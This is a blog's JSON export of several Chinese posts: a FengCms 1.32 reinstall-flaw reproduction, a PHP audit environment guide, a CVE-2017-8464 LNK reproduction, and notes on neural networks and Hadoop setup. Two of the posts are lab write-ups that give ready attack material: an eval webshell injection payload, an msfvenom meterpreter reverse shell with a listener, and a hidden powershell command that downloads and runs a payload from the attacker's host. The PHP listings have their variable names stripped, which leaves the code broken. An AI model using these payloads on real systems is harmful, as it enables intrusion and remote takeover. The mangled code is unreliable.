重装漏洞","date":"2017-10-19T15:53:56.000Z","updated":"2019-02-19T03:32:11.616Z","comments":true,"path":"2017/10/19/FengCms1.32 重装漏洞/","link":"","permalink":"https://shackles.top/2017/10/19/FengCms1.32 重装漏洞/","excerpt":"","text":"FengCms1.32 重装漏洞FengCms基于PHP+MYSQL开发。是一款 开源的网站内容管理系统。系统支持自由订制模型，自由标签系统，使其更加的灵活，可以用FengCms可以打造任意展示模型。 漏洞简介及危害 本次漏洞出现在CMS的安装上，在配置文件中过滤不严禁，在安装过程中，可以插入恶意代码，从而执行任意命令，甚至直接获取Webshell，危害较大。 影响版本 FengCms1.32 实验步骤步骤1：了解漏洞原理本次漏洞的代码漏洞入口在install/index.php中，代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123header(\"Content-type:text/html;charset=utf-8\");define(\"TPL_INCLUDE\",1);// 定义当前路径define('ABS_PATH',dirname(__FILE__));define('ROOT_PATH',dirname(ABS_PATH));if(!['step'])['step']=1;=ROOT_PATH.'/config.php';=ABS_PATH.'/install.sql';if(file_exists(ROOT_PATH.'/upload/INSTALL'))&#123; echo '[removed]alert(\"系统已安装，如需要重新安装，请手工删除upload目录下的INSTALL文件！\");[removed]'; echo '&lt;meta http-equiv=\"refresh\" content=\"0;url=/\"&gt;';&#125;switch(['step'])&#123; case '1': //安装许可协议 include ABS_PATH.\"/step/step1.php\"; break; case '2': //检查安装环境是否满足要求 = ''; if(extension_loaded('gd')) &#123; if(function_exists('imagepng')) .= 'png'; if(function_exists('imagejpeg')) .= ' jpg'; if(function_exists('imagegif')) .= ' gif'; &#125; = '0'; if(extension_loaded('json')) &#123; if(function_exists('json_decode') &amp;&amp; function_exists('json_encode')) = '1'; &#125; //新加fsockopen 函数判断,此函数影响安装后会员注册及登录操作。 if(function_exists('fsockopen')) &#123; = '1'; &#125; = preg_match(\"/^[0-9.]&#123;7,15&#125;$/\", @gethostbyname('www.baidu.cn')) ? 1 : 0; //是否满足FengCms安装需求 = (phpversion() &gt;= '5.2.0' &amp;&amp; extension_loaded('mysql') &amp;&amp; &amp;&amp; &amp;&amp; ) ? 1 : 0; //配置文件是否存在和可写 = (is_readable() &amp;&amp; is_writable()) ? 1 : 0; //上传目录是否可写 = (dir_writeable(ROOT_PATH.\"/upload\")) ? 1 : 0; //模块导出目录是否可写 = (dir_writeable(ROOT_PATH.\"/upload/module\")) ? 1 : 0; //前台缓存目录是否可写 = (dir_writeable(ROOT_PATH.\"/app/cache\")) ? 1 : 0; include ABS_PATH.\"/step/step2.php\"; break; case '3': //填写数据库信息 include ABS_PATH.\"/step/step3.php\"; break; case '4': //正在安装 =@mysql_connect(['host'],['user'],['password']); if(!)&#123; echo '[removed]alert(\"链接主机失败，请检查主机地址、用户名和密码是否正确！\");history.go(-1);[removed]'; exit(); &#125;elseif(intval(mysql_get_server_info())&lt;5)&#123; echo '[removed]alert(\"您的MYSQL版本为'. mysql_get_server_info().'，版本太低，不能安装FengCms!\");history.go(-1);[removed]'; exit(); &#125;else&#123; if(!mysql_select_db(['dbname'],))&#123; //如果数据库不存在，我们就进行创建。 if (!mysql_query(\"CREATE DATABASE \". ['dbname'] .\" default character set utf8;\",)) &#123; echo '[removed]alert(\"数据库不存在，创建不成功\");history.go(-1);[removed]'; &#125;else&#123; if(!mysql_select_db(['dbname'],))&#123; echo '[removed]alert(\"链接数据库失败，请检查数据库是否正确！\");history.go(-1);[removed]'; &#125;else&#123; include \"data.php\"; &#125; &#125; &#125;else&#123; include \"data.php\"; &#125; &#125; break; case '5': //安装完成 include ABS_PATH.\"/step/step5.php\"; = fopen(ROOT_PATH.'/upload/INSTALL','w'); fclose (); break; 上述代码代码首先判断upload/INSTALL文件是否存在，若存在，就弹出JavaScript代码，提示我们需要删除目录下的INSTALL文件，如图： 但在这里我们直接点击确定即可，可以无视它的提示，即是不删除INSTALL文件，也可以进行安装操作。 我们再来看看Install/install.php文件，代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758&lt;?php &#125;// = fopen(, \"w\"); //以写入的方式打开config.php这个文件。if(['install'])&#123; //获取用户提交的数据。 =['host']; =['user']; =['password']; =['dbname']; if(!=@mysql_connect(,,))&#123; echo \"连接数据库失败！请返回上一页检查连接参数 返回修改\"; exit(); &#125;else&#123; mysql_query(\"set names gb2312\"); //设置数据库的编码，注意要与前面一致。 if(!mysql_select_db(,))&#123; //如果数据库不存在，我们就进行创建。 if(!mysql_query())&#123; echo \"创建数据库失败，请确认是否有足够的权限！返回修改\"; exit(); &#125; &#125;echo file_get_contents(); exit; = fopen(, \"w\"); //以写入的方式打开config.php这个文件。 fwrite(,); //将配置信息写入config.php文件。 fclose(); include_once(ABS_PATH.\"config.php\"); //导入配置信息. //下面根据你实际的表的结构跟初始化表的数据来写，这些sql语句，我们在导出时可以找到。 //新建一个表test1 [] = \"CREATE TABLE `test1` ( `id` int(4) NOT NULL auto_increment, `name` varchar(20) character set gb2312 NOT NULL, `major` varchar(40) character set gb2312 NOT NULL, PRIMARY KEY (`id`) ) ENGINE=InnoDB DEFAULT CHARSET=gb2312 AUTO_INCREMENT=1;\"; //新建一个表test2 [] = \"CREATE TABLE `test2` ( `id` int(4) NOT NULL auto_increment, `name` varchar(20) character set gb2312 NOT NULL, `major` varchar(40) character set gb2312 NOT NULL, PRIMARY KEY (`id`) ) ENGINE=InnoDB DEFAULT CHARSET=gb2312 AUTO_INCREMENT=1;\"; //为test1表默认初始化一些数据。 []=\"INSERT INTO `test1` (`name`, `major`) VALUES('张三','电子商务')\"; foreach( as )&#123; if(!mysql_query())&#123; //依次执行以上的sql语句，就是创建表和初始化数据。 echo \"创建表失败或者初始化数据失败\"; exit(); &#125; &#125; mysql_close(); echo \"安装成功\";//可以做一个跳转到首页。 exit(); &#125; 这里系统会判断根目录下的config.php文件是否可写，然后将数据使用POST提交方式，注意这里对传入的数值没有任何的过滤和检测，接下来提交给Config.php文件，我们继续查看config.php文件： 我们这里就可以构造语句，在其安装时，可以插入Payload，对Config.php写入恶意的代码： 1f_&apos;);eval($_POST[b]);// 这样我们就可以通过参数a ，去执行任意的代码。 步骤2：验证漏洞注：如果点击确定后页面立即跳到首页，这时因为服务器配置高响应过快，在真实的场景中相应速度会很慢，足够我们输入相关的内容，这里将upload下INSTALL文件删除即可 1127.0.0.1/install/index.php 上述地址是FengCms的安装地址，打开后我们发现系统提示需要删除INSTALL文件，才可安装，通过上一步代码分析，我们得知，此处只是弹窗警示，程序代码仍然会继续执行下去，因此点击确定： 1f_&apos;);eval($_POST[b]);// 当点击下一步之后，就安装成功了，将Payload插入到了Config.php文件中。 接下来访问127.0.0.1 ，使用Post方式提交数据a=phpinfo(); 。。。 成功利用了FengCms重装漏洞。 修复建议 升级最新版本 在Post写入时，严格增加过滤 验证INSTALL文件是否存在，如果存在则跳出安装流程 参考：FengCms1.32系统重装漏洞导致getshell - 知道创宇 Seebug 漏洞平台https://www.seebug.org/vuldb/ssvid-93224","categories":[],"tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://shackles.top/tags/漏洞复现/"}]},{"title":"PHP代码审计环境搭建","slug":"代码审计环境搭建","date":"2017-10-16T09:52:08.000Z","updated":"2019-02-19T03:32:09.692Z","comments":true,"path":"2017/10/16/代码审计环境搭建/","link":"","permalink":"https://shackles.top/2017/10/16/代码审计环境搭建/","excerpt":"","text":"PHP代码审计环境搭建0x00 环境准备俗话说：工欲善其事必先利其器，高效的代码审计需要必要的工具支持。 1、PHP环境 PHP集成开发环境：phpStudy phpStudy是Windows下一个PHP调试环境的程序集成包。该程序包集成Apache+Nginx+LightTPD+PHP+MySQL+phpMyAdmin+Zend Optimizer+Zend Loader 一次性安装，无须配置即可使用。 2、通用工具 IDE ： PhpStorm PhpStorm是 JetBrains 公司开发的一款商用 PHP 集成开发工具 。 代码编辑器 ：Sublime text Sublime Text一个代码编辑器 ，由程序员Jon Skinner于2008年1月份所开发出来，Sublime Text 具有漂亮的用户界面和强大的功能。 网络调试工具： Postman 调试简单的css、html、脚本等简单的网页基本信息，发送所有类型的HTTP请求，调试WEB API的首选工具。 Xdebug工具 ：xdebug Xdebug是PHP的扩展，用于协助调试和开发。它包含一个用于IDE 的单步调试器 。 burpsuite （神器不解释） 3、自动化代码审计工具： Seay源代码审计系统（mysql 监控工具） 国人开发的一套PHP源代码审计工具。 cobra ：支持多语言审计，暂时不支持Windows平台。 RIPS：free PHP security scanner using static code analysis： 0x01 PHP 环境安装1、选择解压目录为 C:\\phpStudy。 2、如图所示，phpStudy的目录结构。 3 、如果需要Visual C++ 运行库（Visual C++ Redistributable），可到微软官网下载。 下载Visual C++ Redistributable for Visual Studio 2015。选择操作系统对应的位数。 http://www.microsoft.com/zh-cn/download/details.aspx?id=48145 进行安装。 4、点击启动按钮可以看到phpStudy 已经成功启动。 5、点击MySQL管理器，我们常用MySQL-Front管理Mysql数据库。 6、 可以根据需要切换PHP对应版本。 7、在 “其他选项管理器”，可以看到常见的一些使用的工具与常见的快捷按钮。 8、 点击“ My HomePage” 在浏览器中可看到，环境正常。 9、点击程序后可以，phpStudy 后台运行服务。可在屏幕右下角找到。 10、 成功安装phpStudy集成环境，下面安装配置PHP代码调试环境。 0x02 通用工具安装配置1、安装配置PhpStorm下载好phpstorm安装程序打开，根据提示，下一步即可安装。 可以看到我们可以选择使用32位与64位版本的phpstorm。在这里要勾选下载JRE，可以自动下载安装JRE程序，点击下一步。 安装完成启动。 可以选择激活和30试用,在这里我们选择30天试用。 点击“Accept” 可以看到PhpStorm正常启动。 2、安装配置 Sublime text安装 Sublime text ,一路next即可。 这里需要Python环境。安装Python3.6 https://www.python.org/downloads/windows/ 安装 Python3.6，勾选添加Python环境变量，点击”Install Now “。即开始安装。 可以看到成功安装Python环境。 在Sublime text Package Control组件在线安装 按Ctrl+`调出console（注：避免热键冲突） 粘贴以下代码到命令行并回车： 1import urllib.request,os; pf = 'Package Control.sublime-package'; ipp = sublime.installed_packages_path(); urllib.request.install_opener( urllib.request.build_opener( urllib.request.ProxyHandler()) ); open(os.path.join(ipp, pf), 'wb').write(urllib.request.urlopen( 'http://sublime.wbond.net/' + pf.replace(' ','%20')).read()) ​ 重启Sublime Text 3。 ​ 如果在Perferences-&gt;package settings中看到package control这一项，则安装成功。 接下来可以安装一些插件。 3、安装Postman下一步下一步即可，没什么可注意的的地方。 0x03 本地代码调试环境搭建1、安装 xdebugxdebug 网站：https://xdebug.org/wizard.php （1）下载对应操作系统和PHP版本的xdebug 库文件需要特别注意的是需要下载对应操作系统和PHP版本的xdebug 库文件。phpStudy在查看phpinfo，可知php的各种参数。 在官网上提供了一个推荐下载的方式。复制phpinfo 内容到以下这个网站粘贴上去。就可以得到链接下载。https://xdebug.org/wizard.php 目前这种方法只支持PHP大于7的版本。 如下图所示，可以看到下载链接。 我们再刷新一下phpinfo。 可以看到，搜索xdebug成功安装上去。 如果 PHP 版本小于7那么就要到https://xdebug.org/download.php，手动下载需要的版本文件。 （2）编辑php-ini可通过快捷方式打开，也可以进去其目录编辑php.ini文件。 在php.ini文件最后面加上xdebug配置内容。 需要根据自己的环境修改 zend_extension设置自己环境的xdebug.dll文件绝对路径。 这里设置的监听的端口（xdebug.remote_port）是9001，下面步骤中使用9001端口配置。 idekey为360college。其他默认即可。 1234567891011121314151617181920[xdebug]；xdebug.dll文件路径zend_extension =&quot;C:\\phpStudy\\PHPTutorial\\php\\php-5.6.27-nts\\ext\\php_xdebug-2.5.5-5.6-vc11-nts.dll&quot;;运行远程调试xdebug.remote_enable = On;启用性能检测分析xdebug.profiler_enable = On;启用代码自动跟踪xdebug.auto_trace=Onxdebug.profiler_enable_trigger = Onxdebug.profiler_output_name = cachegrind.out.%t.%p;配置端口和监听的域名xdebug.remote_port=9001xdebug.remote_host=&quot;localhost&quot;xdebug.idekey= &quot;360college&quot; 2、 PHPstorm配置（1）打开文件点击open，打开需要调试的PHP文件。 选择php文件目录。 （2）设置PHP环境在File中打开Settings，配置设置。 在设置界面中的PHP选项中添加PHP环境，即为我们之前设置的网站运行的PHP环境。 编辑所需要的选项。 （3）配置Debug在file-&gt;settings-&gt;Languages &amp; Frameworks-&gt;PHP ，选择Debug，设置监听的端口，要和之配置的端口一样。这里配置的是9001。 还要设置DBGp Proxy 如下：端口同样为9001，key为之前设置的360college。 （4）配置 Server在File-&gt;settings-&gt;Languages Frameworks-&gt;PHP 中设置Server。新建Server，设置Name为需要名字，Host设置为localhost，端口等根据环境设置。 （5）配置调试选项在Run/Debug Configurations中新建PHP web Page。 设置Name，选择server 为之前设置的server，根据环境设置Start URL结构。 点击箭头所示Validate验证配置是否正确。如下为正确。 （6）开始调试​ 在index.php文件中点击，打上断点。点击像小虫子一样的图标开始调试。可以看到弹出浏览器界面，调试开始。界面下方看到，调试参数。接下来可以进行代码走查，单步多部执行。 执行调试，看到变量变化情况。 3、 浏览器插件https://confluence.jetbrains.com/display/PhpStorm/Browser+Debugging+Extensions https://addons.mozilla.org/zh-CN/firefox/addon/the-easiest-xdebug/ 编码设置： 0x04 远程代码调试环境搭建1、 PHP中配置xdebug下载xdebug文件。 PHP.ini 文件根据环境添加以下内容。 123456789101112131415161718192021[xdebug]zend_extension =&quot;D:\\phpStudy2018\\PHPTutorial\\php\\php-5.4.45-nts\\ext\\php_xdebug-2.4.1-5.4-vc9-nts-x86_64.dll&quot;;运行远程调试xdebug.remote_enable = On;启用性能检测分析xdebug.profiler_enable = On;启用代码自动跟踪xdebug.auto_trace=Onxdebug.profiler_enable_trigger = Onxdebug.profiler_output_name = cachegrind.out.%t.%p;如果配置该项就不需要配xdebug.remote_hostxdebug.remote_connect_back=1;配置端口和监听的域名xdebug.remote_port=9101;xdebug.remote_host=&quot;localhost&quot;;配置id keyxdebug.idekey= &quot;360college&quot; 2、 PhpStorm配置（1）SFTP同步代码 通过FTP/SFTP/FTPS下载服务器需要调试的代码，按照下图提示，下一步下一步进行配置。 创建新的工程，工程名字根据需求填写。选择工程的目录路径。 看到正在下载代码。 （2）配置 Debug （2）配置 Server （5）配置调试选项待补充。 （6）开始调试待补充。","categories":[],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"https://shackles.top/tags/代码审计/"}]},{"title":"Windows远程命令执行漏洞（震网漏洞）-CVE-2017-8464","slug":"Windows远程命令执行漏洞（震网漏洞）-CVE-2017-8464","date":"2017-10-15T09:52:08.000Z","updated":"2019-02-19T03:32:10.750Z","comments":true,"path":"2017/10/15/Windows远程命令执行漏洞（震网漏洞）-CVE-2017-8464/","link":"","permalink":"https://shackles.top/2017/10/15/Windows远程命令执行漏洞（震网漏洞）-CVE-2017-8464/","excerpt":"","text":"Windows远程命令执行漏洞-震网三代漏洞（CVE-2017-8464）漏洞实验原理&emsp;&emsp;攻击者可以向用户呈现包含恶意的.LNK文件和相关联的恶意二进制文件的可移动驱动器或远程共享。 当用户在Windows资源管理器或解析.LNK文件的任何其他应用程序中打开此驱动器（或远程共享）时，恶意二进制程序将在目标系统上执行攻击者选择的代码，成功利用此漏洞的攻击者可以获得与本地用户相同的用户权限。 注释:.LNK是windows系统内应用程序快捷方式文件的文件类型后缀名 。震网三代”LNK文件远程代码执行漏洞（CVE-2017-8464）可以用于穿透物理隔离网络。 漏洞影响范围: Windows 7 Windows 8.1 Windows RT 8.1 Windows 10 Windows Server 2008 Windows Server 2008 R2 Windows Server 2012 Windows Server 2012 R2 Windows Server 2016 漏洞复现第一步 漏洞验证msfvenom生成 powershell对应payload。 1msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.0.11 [攻击机IP地址] -f psh-reflection&gt;payload.ps1 1ls 输入密码360College 1sudo mv payload.ps1 /var/www/html 启动apache服务器。 123service apache2 startservice apache2 status 第二步 msf监听12345msfconsoleuse multi/handlerset payload windows/meterpreter/reverse_tcpset lhost 192.168.0.11 [攻击机IP地址]exploit 第三步 靶机上钩登录靶机，在靶机上验证。 在靶机桌面上新建快捷方式 ，插入对象的位置： 插入以下代码。 1powershell -windowstyle hidden -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString(‘http://192.168.0.11/payload.ps1‘);test.ps1\" 再点击完成。 1payload.exe 点击payload.exe。 在攻击机上可看到漏洞利用成功： m","categories":[],"tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://shackles.top/tags/漏洞复现/"}]},{"title":"Covolutions Neural Netwrk","slug":"Covolutions Neural Netwrk","date":"2017-10-08T15:53:56.000Z","updated":"2018-05-23T08:22:04.110Z","comments":true,"path":"2017/10/08/Covolutions Neural Netwrk/","link":"","permalink":"https://shackles.top/2017/10/08/Covolutions Neural Netwrk/","excerpt":"","text":"Covolutions Neural Netwrk​ 卷积神经网络有三种层：卷积层、池化层和全连接层（Convolutional Layer, Pooling Layer, 及Fully-Connected Layer）。 [INPUT - CONV - RELU -x POOL - FC] 也就是 [输入-卷积-激活-池化-分类得分 卷积神经网络是计算机自主学习的一种方式。（自学习） 卷积神经网络（CNN） 由Huabel与Wiesel在研究猫的脑皮层中用局部敏感和方法选择的神经元时发现其独特的网络结构可以有效的降低反馈神经网络的复杂性提出。 DCNN（Deep ConvolutionalNeural Network，深度卷积网络）与LSTM（LongShort Term Memory，长短时记忆网络） 123数据-》自学习-》结果输入-》 算法 -》输出 空间共享 ​ 计算机视觉里经常使卷积神经网络，即CNN，是一种对人脑比较精准的模拟。 ​ 什么是卷积？卷积就是两个函数之间的相互关系，然后得出一个新的值，他是在连续空间做积分计算，然后在离散空间内求和的过程。实际上在计算机视觉里面，可以把卷积当做一个抽象的过程，就是把小区域内的信息统计抽象出来。 比如，对于一张爱因斯坦的照片，我可以学习n个不同的卷积和函数，然后对这个区域进行统计。可以用不同的方法统计，比如着重统计中央，也可以着重统计周围，这就导致统计的和函数的种类多种多样，为了达到可以同时学习多个统计的累积和。 从LeNet到AlexNet 物体检测问题 Region CNN YOLO FACEBOOK提出来的YOLO网络，物体检测， 权重 W 与偏移量B 相同 不同的是输入的值 ConvNet体系结构：卷积层，池层和完全连接层（正如在常规神经网络中所见） ConvNetC++中卷积神经网络的GPU实现 一个示例ConvNet架构的激活。初始卷存储原始图像像素（左），最后一个卷存储类分数（右）。沿着处理路径的每个激活量显示为一列。由于难以将3D体积可视化，因此我们将行卷切成行。最后一层卷保留每个类的分数，但在这里我们只可视化排序的前5个分数，并打印每个分数的标签。完整的基于Web的演示文稿显示在我们网站的标题中。这里所示的架构是一个小型的VGG网络，稍后将讨论。 双曲正切函数是双曲函数中的一个函数。 输入图像I。为了减小复杂度，一般使用灰度图像。当然，也可以使用RGB彩色图像，此时输入图像有三张，分别为RGB分量。输入图像一般需要归一化，1、如果使用sigmoid激活函数，则归一化到[0,1] 2、 如果使用tanh激活函数，则归一化到[-1, 1]。 多个卷积（C）-下采样（S）层。将上一层的输出与本层权重W做卷积得到各个C层，然后下采样得到各个S层。怎么做以及为什么，下面会具体分析。这些层的输出称为FeatureMap。 光栅化（X）。是为了与传统的多层感知器全连接。即将上一层的所有Feature Map的每个像素依次展开，排成一列。 传统的多层感知器（N&amp;O）。最后的分类器一般使用Softmax，如果是二分类，当然也可以使用LR。 输入层-隐层：是一个全连接的网络，即每个输入节点都连接到所有的隐层节点上。更详细地说，可以把输入层视为一个向量 xx ，而隐层节点 jj 有一个权值向量 θjθj 以及偏置 bjbj ，激活函数使用 sigmoid 或 tanh ，那么这个隐层节点的输出应该是 1fj(x)=act(θTjx+bj)fj(x)=act(θjTx+bj) 也就是每个隐层节点都相当于一个感知器。每个隐层节点产生一个输出，那么隐层所有节点的输出就成为一个向量，即 1f(x)=act(Θx+b)f(x)=act(Θx+b) 若输入层有 mm 个节点，隐层有 nn 个节点，那么 Θ=[θT]Θ=[θT] 为 n×mn×m 的矩阵，xx 为长为 mm 的向量，bb 为长为 nn 的向量，激活函数作用在向量的每个分量上， f(x)f(x) 返回一个向量。 隐层-输出层:可以视为级联在隐层上的一个感知器。若为二分类，则常用LogisticRegression；若为多分类，则常用Softmax Regression。 卷积、下采样、光栅化、多层感知器预测 卷积离散卷积运算。假设有二维离散函数 f(x,y),g(x,y) ， 那么它们的卷积定义为 从这里，可以看到卷积的重要的物理意义是：一个函数（如：单位响应）在另一个函数（如：输入信号）上的加权叠加。 下采样下采样，即池化，目的是减小特征图，池化规模一般为2×2。常用的池化方法有： 最大池化（Max Pooling）。取4个点的最大值。这是最常用的池化方法。 均值池化（Mean Pooling）。取4个点的均值。 高斯池化。借鉴高斯模糊的方法。不常用。具体过程不是很清楚。。。 可训练池化。训练函数 f ，接受4个点为输入，出入1个点。不常用。 光栅化图像经过池化-下采样后，得到的是一系列的特征图，而多层感知器接受的输入是一个向量。因此需要将这些特征图中的像素依次取出，排列成一个向量。具体说，对特征图 X1,X2,…,Xj ，光栅化后得到的向量","categories":[],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"https://shackles.top/tags/机器学习/"}]},{"title":"人工神经网络","slug":"人工神经网络","date":"2017-10-05T15:53:56.000Z","updated":"2018-04-01T02:20:56.438Z","comments":true,"path":"2017/10/05/人工神经网络/","link":"","permalink":"https://shackles.top/2017/10/05/人工神经网络/","excerpt":"","text":"人工神经网络人工神经网络最重要的是 : 分类 神经网络分类： ANN（人工神经网络） LSTM （循环神经网络） 时间共享 CNN（卷积神经网络）空间共享 基本流程： 1分类样本--》训练样本--》建模--》测试样本--》结果 参考：https://www.zhihu.com/question/22553761 空间切一刀 + 某种激活函数(0-1阶跃、sigmoid、, sigmoid （或者 tanh ）), 但是可以一层一层级联​ 这一层是下一层的输入。 ​ 类似于人类大脑的神经元之间能够不断的调节连接强度从而达到不断的训练与学习的目的，人工神经网络同样可以做到不断的调整输入连接上的权值使得该神经网络能够更加的适应训练集合。 ​ 在人工神经网络方法学习训练的过程当中，学习样本的特征向量被传递进输入端作为输入的数据，分类结果作为学习样本的输出，也是整个网络的输出；然后，人工神经网络将会根据上一步的样本输出调节输入的权值 w，使得训练之后的误差逐步减小。通过不断的训练与调整的过程，使得训练样本的实际输出越来越接近于真实目标。 1234567其中函数 f（）称为非线性激活函数，激活函数根据实际应用确定，调整权值。 反向传播算法 ： 结果反向决定输入，不断调整权值， 常用激活 函数 ： logistic Sigmoid sign , tanh 感知机： 其中激活函数 act 可以使用{sign, sigmoid, tanh}之一。 l 激活函数使用符号函数 sign ，可求解损失函数最小化问题，通过梯度下降确定参数 l 激活函数使用 sigmoid （或者 tanh ），则分类器事实上成为Logistic Regression，可通过梯度上升极大化似然函数，或者梯度下降极小化损失函数，来确定参数 l 如果需要多分类，则事实上成为SoftmaxRegression l 如要需要分离超平面恰好位于正例和负例的正中央，则成为支持向量机（SVM）。 多层感知器感知器存在的问题是，对线性可分数据工作良好，如果设定迭代次数上限，则也能一定程度上处理近似线性可分数据。但是对于非线性可分的数据，比如最简单的异或问题，感知器就无能为力了。这时候就需要引入多层感知器这个大杀器。 多层感知器的思路是，尽管原始数据是非线性可分的，但是可以通过某种方法将其映射到一个线性可分的高维空间中，从而使用线性分类器完成分类。图1中，从X到O这几层，正展示了多层感知器的一个典型结构，即输入层-隐层-输出层。 logistic 函数非对称： 对称： 反馈神经网络 BP神经网络Hebb改变权重上个神经元进行调整 。学习是一类相关学习，算法的基本思想是：如果有两个神经元同时兴奋，则它们之间的连接强度的增强与它们的激励的乘积成正比 在Hebb学习规则中，学习信号简单地等于神经元的输出： 用yi(k)表示单元i 在k 时刻的激活值（输出），yj (k)表示单元j在 k 时刻的激活值，wij(k)表示单元i到单元j的连接权值，则Hebb学习规则可表示如下： ∆Wij(k)=Wij(k+1)-Wij(k)=ηyi(k)yj(k+1),式中η为学习速率 权值调整量与输入输出的乘积成正比。","categories":[],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"https://shackles.top/tags/机器学习/"}]},{"title":"服务器配置","slug":"服务器配置","date":"2017-10-05T15:53:56.000Z","updated":"2018-11-15T03:31:39.039Z","comments":true,"path":"2017/10/05/服务器配置/","link":"","permalink":"https://shackles.top/2017/10/05/服务器配置/","excerpt":"","text":"服务器配置CentOS教程 / 软件使用配置 http://www.centoscn.com/image-text/config/ CentOS 修改主机名 - Virson Ma - 博客园 http://www.cnblogs.com/mawanglin2008/p/3530790.html 区别 chown和chmod的用法 - 博客频道 - CSDN.NET http://blog.csdn.net/doupei2006/article/details/8015986 chown用法 用来更改某个目录或文件的用户名和用户组的 chown 用户名:组名文件路径（可以是就对路径也可以是相对路径） 例1：chown root:root /tmp/tmp1 就是把tmp下的tmp1的用户名和用户组改成root和root（只修改了tmp1的属组）. 例2：chown -R root:root /tmp/tmp1 就是把tmp下的tmp1下的所有文件的属组都改成root和root。 chmod用法 用来修改某个目录或文件的访问权限。 语法：chmod [who] [+ | - | =] [mode] 文件名 命令中各选项的含义为： 操作对象who可是下述字母中的任一个或者它们的组合： u 表示“用户（user）”，即文件或目录的所有者。 g 表示“同组（group）用户”，即与文件属主有相同组ID的所有用户。 o 表示“其他（others）用户”。 a 表示“所有（all）用户”。它是系统默认值。 Hadoop2.7.3完全分布式集群搭建和测试 - 如果一切重来 - 博客频道 - CSDN.NET http://blog.csdn.net/xiaoxiangzi222/article/details/52757168 细细品味Hadoop - 随笔分类 - 虾皮 -博客园 http://www.cnblogs.com/xia520pi/category/346943.html 低版本物理机部署高版本OVF 报“硬件系列vmx12不受支持“解决办法 - 搬砖笔记 - 博客频道 - CSDN.NET http://blog.csdn.net/xfks55/article/details/52858622 vim /etc/sysconfig/network-scripts/ifcgf-eth0 静态地址 scp -r /usr/hadooproot@node1:/usr/hadoop Usage: hdfs [–config confdir] [–loglevel loglevel] COMMAND ​ where COMMAND is oneof: dfs run a filesystem command onthe file systems supported in Hadoop. classpath prints the classpath namenode -format format the DFS filesystem secondarynamenode run the DFS secondary namenode namenode run the DFS namenode journalnode run the DFS journalnode zkfc run the ZK Failover Controllerdaemon datanode run a DFS datanode dfsadmin run a DFS admin client haadmin run a DFS HA admin client fsck run a DFS filesystem checkingutility balancer run a cluster balancing utility jmxget get JMX exported values fromNameNode or DataNode. mover run a utility to move block replicasacross ​ storagetypes oiv apply the offline fsimageviewer to an fsimage oiv_legacy apply the offline fsimage viewer toan legacy fsimage oev apply the offline editsviewer to an edits file fetchdt fetch a delegation token from theNameNode getconf get config values fromconfiguration groups get the groups which usersbelong to snapshotDiff diff two snapshots of a directory ordiff the ​ currentdirectory contents with a snapshot lsSnapshottableDir list all snapshottable dirs owned by thecurrent user ​ Use -help to see options portmap run a portmap service nfs3 run an NFS version 3 gateway cacheadmin configure the HDFS cache crypto configure HDFS encryption zones storagepolicies list/get/set block storage policies version print the version 1、关闭firewall： systemctl stopfirewalld.service #停止firewall systemctl disablefirewalld.service #禁止firewall开机启动 firewall-cmd –state #查看默认防火墙状态（关闭后显示notrunning，开启后显示running） 关闭selinux 2）禁用selinux ​ 编辑 “/etc/selinux/config“文件，设置”SELINUX=disabled“ nano slave bin/hdfs namenode -**format sbin/start-all.sh** hdfs dfsadmin -report yum installjava-1.7.0-openjdk-devel.x86_64 安装jps Hadoop 启动节点Datanode失败解决_服务器应用_Linux公社-Linux系统门户网站 http://www.linuxidc.com/Linux/2014-11/108822.htm 先格式化再启动 ​ 出现该问题的原因：在第一次格式化dfs后，启动并使用了hadoop，后来又重新执行了格式化命令（hdfs namenode -format)，这时namenode的clusterID会重新生成，而datanode的clusterID 保持不变。 删除初始文件 hadoop集群只有一个datanode启动问题 - yijichangkong的专栏 - 博客频道 - CSDN.NET http://blog.csdn.net/yijichangkong/article/details/45438931 onlyoffice/documentserver - Docker Hub https://hub.docker.com/r/onlyoffice/documentserver/ 快速入门指南 http://docs.rancher.com/rancher/v1.5/en/quick-start-guide/ 最重要的 - 开源的，首选的Slack-alternative https://bitnami.com/ https://www.nagios.org/ http://wiki.pentaho.com/display/COM/Community+Wiki+Home https://bitnami.com/stacks/project-management","categories":[],"tags":[{"name":"运维","slug":"运维","permalink":"https://shackles.top/tags/运维/"}]},{"title":"机器学习重要算法","slug":"机器学习重要算法","date":"2017-10-01T15:53:56.000Z","updated":"2018-05-23T02:03:26.363Z","comments":true,"path":"2017/10/01/机器学习重要算法/","link":"","permalink":"https://shackles.top/2017/10/01/机器学习重要算法/","excerpt":"","text":"机器学习重要算法监督学习和非监督学习。 监督学习： 分类和回归； 监督学习： 聚类算法，密度估计算法。 分类 :需已知样本特征 Classification (分类)，一个 classifier 会从它得到的训练集中进行“学习”，从而具备对未知数据进行分类的能力，这种提供训练数据的过程通常叫做 supervised learning (监督学习)（样本有标签）， 所谓分类，简单来说，就是根据文本的特征或属性，划分到已有的类别中。如在自然语言处理NLP中，我们经常提到的文本分类便就是一个分类问题，一般的模式分类方法都可用于文本分类研究。 常用的分类算法包括： k-最近邻法(k-nearest neighbor，kNN)， 决策树分类法， 朴素的贝叶斯分类算法(native Bayesian classifier)(NBC)、 基于支持向量机(SVM)的分类器， 神经网络法(SNN)， 神经网络（CNN) 模糊分类法等等 分类作为一种监督学习方法，要求必须事先明确知道各个类别的信息，并且断言所有待分类项都有一个类别与之对应。但是很多时候上述条件得不到满足，尤其是在处理海量数据的时候，如果通过预处理使得数据满足分类算法的要求，则代价非常大，这时候可以考虑使用聚类算法。 聚类：把相似的对象聚合 Clustering(聚类)，简单地说就是把相似的东西分到一组，聚类的时候，我们并不关心某一类是什么，我们需要实现的目标只是把相似的东西聚到一起，因此，一个聚类算法通常只需要知道如何计算相似 度就可以开始工作了，因此 clustering 通常并不需要使用训练数据进行学习，这在 Machine Learning 中被称作 unsupervised learning (无监督学习). 